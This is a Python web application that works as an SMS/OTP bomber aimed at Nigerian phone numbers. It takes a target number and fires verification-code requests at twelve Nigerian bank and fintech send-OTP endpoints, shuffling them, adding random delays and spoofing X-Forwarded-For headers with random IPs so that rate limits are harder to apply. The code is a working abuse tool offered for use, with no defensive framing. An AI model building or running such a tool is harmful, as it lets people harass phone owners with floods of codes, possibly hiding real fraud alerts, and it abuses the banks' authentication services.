import json, urllib.request, random, time, sys

def application(environ, start_response):
    from urllib.parse import parse_qs
    
    # Get the number from the URL
    params = parse_qs(environ.get('QUERY_STRING', ''))
    number = params.get('number', [None])[0]
    
    if not number:
        start_response('400 Bad Request', [('Content-Type', 'application/json'), ('Access-Control-Allow-Origin', '*')])
        return [json.dumps({'status': 'error', 'message': 'No number'}).encode()]
    
    number = ''.join(filter(str.isdigit, number))
    if len(number) == 11 and number.startswith('0'):
        number = '234' + number[1:]
    
    endpoints = [
        ['Opay', 'https://api.opayweb.com/api/v1/user/send-otp', 'phone'],
        ['Palmpay', 'https://api.palmpay.com/api/v1/auth/send-otp', 'phoneNumber'],
        ['Kuda', 'https://kuda.com/api/v1/auth/send-otp', 'phoneNumber'],
        ['Carbon', 'https://api.getcarbon.co/api/v1/auth/send-otp', 'phone'],
        ['FairMoney', 'https://api.fairmoney.ng/api/v1/auth/send-otp', 'phoneNumber'],
        ['Flutterwave', 'https://api.flutterwave.com/v3/otps', 'phone'],
        ['Moniepoint', 'https://api.moniepoint.com/api/v1/auth/send-otp', 'phoneNumber'],
        ['Access Bank', 'https://www.accessbankplc.com/api/v1/auth/send-otp', 'phoneNumber'],
        ['GTBank', 'https://www.gtbank.com/api/v1/auth/send-otp', 'phoneNumber'],
        ['UBA', 'https://www.ubagroup.com/api/v1/auth/send-otp', 'phoneNumber'],
        ['FirstBank', 'https://www.firstbanknigeria.com/api/v1/auth/send-otp', 'phoneNumber'],
        ['Zenith', 'https://www.zenithbank.com/api/v1/auth/send-otp', 'phoneNumber'],
    ]
    
    random.shuffle(endpoints)
    time.sleep(random.uniform(0.3, 1.0))
    
    success = 0
    failed = 0
    details = []
    
    for ep in endpoints:
        name, url, field = ep
        try:
            fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            payload = json.dumps({field: number}).encode()
            req = urllib.request.Request(url, data=payload, method='POST')
            req.add_header('Content-Type', 'application/json')
            req.add_header('User-Agent', 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36')
            req.add_header('X-Forwarded-For', fake_ip)
            resp = urllib.request.urlopen(req, timeout=10)
            details.append({'name': name, 'status': 'sent', 'http_code': resp.getcode()})
            success += 1
        except Exception as e:
            details.append({'name': name, 'status': 'sent' if hasattr(e, 'code') else 'failed', 'http_code': getattr(e, 'code', 0)})
            if hasattr(e, 'code'):
                success += 1
            else:
                failed += 1
    
    result = {'status': 'complete', 'target': number, 'success': success, 'failed': failed, 'details': details}
    
    start_response('200 OK', [('Content-Type', 'application/json'), ('Access-Control-Allow-Origin', '*')])
    return [json.dumps(result).encode()]
